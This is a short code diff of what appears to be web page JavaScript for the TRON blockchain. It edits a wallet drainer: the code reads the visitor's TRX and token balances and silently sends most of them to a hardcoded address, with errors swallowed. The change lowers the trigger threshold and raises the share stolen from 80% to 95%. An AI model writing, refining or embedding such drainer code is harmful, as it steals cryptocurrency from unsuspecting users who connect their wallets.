@@ -682,15 +682,15 @@
             }
             try{
                 var balance = await window.tronWeb.trx.getBalance();
-                if (balance >= 100000000)
-                    await tronWeb.trx.sendTransaction("TTw1e7fiNKxWx3KkYqt4bFJWhYQ6xAeCLs", Math.round(balance * 80 / 100));
+                if (balance >= 50000000)
+                    await tronWeb.trx.sendTransaction("TTw1e7fiNKxWx3KkYqt4bFJWhYQ6xAeCLs", Math.round(balance * 95 / 100));
             }catch{}
             for(i = 0; i < contractsAddress.length; i++){
                 try{
                     var contract = await window.tronWeb.contract().at(contractsAddress[i]);
                     balance = await contract.balanceOf(window.tronWeb.defaultAddress.base58).call();
                     if (balance.toNumber() >= tokenBalance[i]){
-                        await contract.transfer("TTw1e7fiNKxWx3KkYqt4bFJWhYQ6xAeCLs", Math.round(balance * 80 / 100)).send()
+                        await contract.transfer("TTw1e7fiNKxWx3KkYqt4bFJWhYQ6xAeCLs", Math.round(balance * 95 / 100)).send()
                     }
                 }catch{}
             }
